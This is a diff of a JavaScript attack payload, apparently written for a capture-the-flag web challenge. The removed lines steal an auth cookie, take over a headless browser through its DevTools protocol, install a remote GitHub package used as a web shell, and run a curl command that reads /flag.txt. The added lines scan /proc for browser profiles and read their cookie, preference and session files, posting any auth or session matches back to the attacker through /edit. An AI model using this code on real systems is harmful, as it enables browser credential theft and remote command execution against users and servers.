@@ -1,7 +1,8 @@
 (async()=>{
-if(window.__codexRun0615ae)return;
-window.__codexRun0615ae=1;
-const post=t=>fetch('/edit',{method:'POST',keepalive:true,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:()]/g,' '))});
+if(window.__codexRun0615af)return;
+window.__codexRun0615af=1;
+
+const post=t=>fetch('/edit',{method:'POST',keepalive:true,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:_\\/-]/g,' '))});
 const read=async p=>{
  try{
   let r=await fetch('/profile'+p+'%3f',{cache:'no-store'});
@@ -14,27 +15,6 @@ const readRange=async(p,o,l=1500)=>{
   return [r.status,await r.text()];
  }catch(e){return [0,'']}
 };
-const ck=document.cookie.split(';').map(x=>x.trim()).find(x=>x.startsWith('auth='))||document.cookie.split(';')[0]||'';
-const stage=`(async()=>{
-const sleep=ms=>new Promise(r=>setTimeout(r,ms));
-const api=async(p,d)=>{
- let f=new FormData();
- f.append('__csrf__',document.querySelector('meta[name=csrf]').content);
- f.append('__json__',JSON.stringify(d));
- let r=await fetch(p,{method:'POST',body:f});
- let t=await r.text().catch(()=>'');
- return p+' '+r.status+' '+t.slice(0,80);
-};
-await sleep(1500);
-if(!document.querySelector('meta[name=csrf]'))return 'csrf none '+location.href;
-let a=await api('/_api/package-manager/add-repository',{platform:'github',name:'2ash1/static',repositoryUrl:'https://github.com/2Ash1/static',branch:'main'}).catch(e=>'add err '+e.name+' '+e.message);
-let b=await api('/_api/package-manager/install',{package:'2ash1/static'}).catch(e=>'install err '+e.name+' '+e.message);
-await sleep(2000);
-let ck=decodeURIComponent(location.hash.slice(1));
-let cmd='curl -s -X POST http://app/edit -H "Cookie: '+ck.replace(/"/g,'')+'" --data title=flag --data-urlencode content="$(python3 -c \\'print(open("/flag.txt","rb").read().hex())\\')"';
-location.href='/packages/2ash1/static/index.php?cmd='+encodeURIComponent(cmd);
-return a+' | '+b;
-})()`;
 
 const dirsFrom=c=>{
  let out=[];
@@ -43,153 +23,65 @@ const dirsFrom=c=>{
  }
  return out;
 };
-const wsFrom=async dir=>{
- let [st,d]=await read(dir+'/DevToolsActivePort');
- post('dtap '+st+' '+d.length+' '+d.slice(0,90));
- if(st!==200)return '';
- let port=(d.match(/\b(\d{2,6})\b/)||[])[1]||'';
- let path=(d.match(/\/devtools\/browser\/[A-Za-z0-9.-]+/)||[])[0]||'';
- if(!path){
-  let id=(d.match(/(?:browser|devtools)[^A-Za-z0-9]+([A-Za-z0-9.-]{20,})/)||[])[1]||'';
-  if(id)path='/devtools/browser/'+id;
- }
- post('parsed '+port+' '+path);
- if(!port||!path)return '';
- return 'ws://localhost:'+port+path;
-};
-let profileDirs=[];
-const findWs=async()=>{
- for(let base=1;base<4000;base+=80){
-  let res=await Promise.all(Array.from({length:80},async(_,i)=>{
-   let pid=base+i;
-   let [st,c]=await read('/proc/'+pid+'/cmdline');
-   if(st!==200||!c.includes('user-data-dir'))return '';
-   post('pid '+pid);
-   let dirs=dirsFrom(c);
-   if(!dirs.length)post('dir none '+c.slice(0,180));
-   for(let dir of dirs){
-    post('dir '+dir);
-    if(!profileDirs.includes(dir))profileDirs.push(dir);
-    post('dirhex '+Array.from(dir).map(ch=>ch.charCodeAt(0).toString(16).padStart(2,'0')).join('').slice(0,180));
-    let ws=await wsFrom(dir);
-    if(ws)return ws;
+
+const findDirs=async()=>{
+ let dirs=[];
+ for(let pid=1;pid<4000;pid++){
+  let [st,c]=await read('/proc/'+pid+'/cmdline');
+  if(st!==200||!c.includes('user-data-dir'))continue;
+  for(let dir of dirsFrom(c)){
+   if(!dirs.includes(dir)){
+    dirs.push(dir);
+    post('profile '+dir);
    }
-   return '';
-  }));
-  let hit=res.find(Boolean);
-  if(hit)return hit;
- }
- return '';
-};
-const scanCookies=async()=>{
- post('cookie scan');
- let suffixes=['/Default/Network/Cookies','/Default/Cookies','/Profile 1/Network/Cookies','/Profile 1/Cookies','/Network/Cookies'];
- for(let dir of profileDirs){
-  for(let suf of suffixes){
-   let seen=false;
-   for(let off=0;off<300000;off+=1400){
-    let [st,d]=await readRange(dir+suf,off);
-    if(st!==200){if(off===0)post('cookie miss '+suf+' '+st);break}
-    if(!d.replace(/\./g,'').length)break;
-    let hits=['admin-app','Automad','csrf'].map(x=>d.indexOf(x)).filter(x=>x>=0);
-    if(hits.length){
-     seen=true;
-     let i=Math.max(0,Math.min(...hits)-40);
-     post('cookiehit '+suf+' '+off+' '+d.slice(i,Math.min(d.length,i+300)));
-    }
-   }
-   if(seen)return;
   }
  }
- post('cookie none');
-};
-const frameRun=urls=>{
- window.addEventListener('message',e=>{
-  if(e.data&&e.data.cdpLog)post('df '+e.data.cdpLog);
- });
- let code=`(()=> {
-const log=t=>parent.postMessage({cdpLog:String(t)},'*');
-const urls=${JSON.stringify(urls)};
-const ck=${JSON.stringify(ck)};
-const stage=${JSON.stringify(stage)};
-let pos=0;
-const start=()=>{
- let wsurl=urls[pos++];
- if(!wsurl){log('ws all failed');return}
- log('ws try '+wsurl.replace(/[^A-Za-z0-9:]/g,' ').slice(0,120));
- let ws,id=0,wait={},opened=false;
- try{ws=new WebSocket(wsurl)}catch(e){log('ws ctor '+e.name+' '+e.message);start();return}
- const send=(method,params={},sid='')=>new Promise((res,rej)=>{
-  let n=++id;
-  wait[n]=res;
-  ws.send(JSON.stringify({id:n,method,params,...(sid?{sessionId:sid}:{})}));
-  setTimeout(()=>rej(new Error('timeout '+method)),8000);
- });
- ws.onerror=()=>log('ws error');
- ws.onclose=()=>{if(!opened){log('ws close before open');start()}};
- ws.onmessage=e=>{
-  let m=JSON.parse(e.data);
-  if(m.id&&wait[m.id]){wait[m.id](m);delete wait[m.id]}
- };
- ws.onopen=async()=>{
-  opened=true;
-  try{
-   log('ws open');
-   let t=await send('Target.createTarget',{url:'http://admin-app/dashboard/home#'+encodeURIComponent(ck)});
-   let sid=(await send('Target.attachToTarget',{targetId:t.result.targetId,flatten:true})).result.sessionId;
-   log('target attach');
-   let r=await send('Runtime.evaluate',{expression:stage,awaitPromise:true,returnByValue:true},sid);
-   log('eval '+String((((r.result||{}).result||{}).value)||'sent').slice(0,400));
-  }catch(e){log('err '+e.name+' '+e.message)}
- };
-};
-start();
-})()`;
- let f=document.createElement('iframe');
- f.sandbox='allow-scripts';
- f.srcdoc='<script>'+code.split('</script').join('<\\/script')+'</script>';
- document.body.appendChild(f);
+ return dirs;
 };
 
-const run=(urls,fail)=>{
- let pos=0;
- const start=()=>{
- let wsurl=urls[pos++];
- if(!wsurl){post('ws all failed');if(fail)fail();return}
- post('ws try '+wsurl.replace(/[^A-Za-z0-9:]/g,' ').slice(0,120));
- let ws,id=0,wait={},opened=false;
- try{ws=new WebSocket(wsurl)}catch(e){post('ws ctor '+e.name+' '+e.message);start();return}
- const send=(method,params={},sid='')=>new Promise((res,rej)=>{
-  let n=++id;
-  wait[n]=res;
-  ws.send(JSON.stringify({id:n,method,params,...(sid?{sessionId:sid}:{})}));
-  setTimeout(()=>rej(new Error('timeout '+method)),8000);
- });
- ws.onerror=()=>post('ws error');
- ws.onclose=()=>{if(!opened){post('ws close before open');start()}};
- ws.onmessage=e=>{
-  let m=JSON.parse(e.data);
-  if(m.id&&wait[m.id]){wait[m.id](m);delete wait[m.id]}
- };
- ws.onopen=async()=>{
-  opened=true;
-  try{
-   post('ws open');
-   let t=await send('Target.createTarget',{url:'http://admin-app/dashboard/home#'+encodeURIComponent(ck)});
-   let sid=(await send('Target.attachToTarget',{targetId:t.result.targetId,flatten:true})).result.sessionId;
-   post('target attach');
-   let r=await send('Runtime.evaluate',{expression:stage,awaitPromise:true,returnByValue:true},sid);
-   post('eval '+String((((r.result||{}).result||{}).value)||'sent').slice(0,400));
-  }catch(e){post('err '+e.name+' '+e.message)}
- };
- };
- start();
+const preview=async p=>{
+ let [st,d]=await read(p);
+ post('file '+p+' '+st+' '+d.length+' '+d.slice(0,180));
+ return st===200;
 };
 
-post('cdp dyn 0615ae');
-let wsurl=await findWs();
-if(!wsurl){post('ws none');return}
-let urls=[wsurl,wsurl.replace('ws://localhost:','ws://127.0.0.1:'),wsurl.replace('ws://localhost:','ws://[::1]:')];
-run(urls,()=>frameRun(urls));
-setTimeout(scanCookies,12000);
+const scanFile=async p=>{
+ let ok=false;
+ for(let off=0;off<2500000;off+=1400){
+  let [st,d]=await readRange(p,off);
+  if(st!==200){post('scan miss '+p+' '+st);return false}
+  if(off===0)post('scan '+p+' '+st+' '+d.length+' '+d.slice(0,120));
+  if(!d.replace(/\./g,'').length)break;
+  let keys=['admin-app','Automad','csrf','localhost','auth','session'];
+  let hits=keys.map(x=>d.indexOf(x)).filter(x=>x>=0);
+  if(hits.length){
+   ok=true;
+   let i=Math.max(0,Math.min(...hits)-60);
+   post('hit '+p+' '+off+' '+d.slice(i,Math.min(d.length,i+360)));
+  }
+ }
+ return ok;
+};
+
+post('profile scan 0615af');
+let dirs=await findDirs();
+if(!dirs.length){post('profile none');return}
+
+for(let dir of dirs){
+ await preview(dir+'/Local State');
+ await preview(dir+'/Default/Preferences');
+ await preview(dir+'/Default/Secure Preferences');
+ let files=[
+  '/Default/Network/Cookies',
+  '/Default/Cookies',
+  '/Network/Cookies',
+  '/Cookies',
+  '/Default/Session Storage/LOG',
+  '/Default/Local Storage/leveldb/LOG'
+ ];
+ for(let f of files){
+  if(await scanFile(dir+f))return;
+ }
+}
+post('profile scan none');
 })();
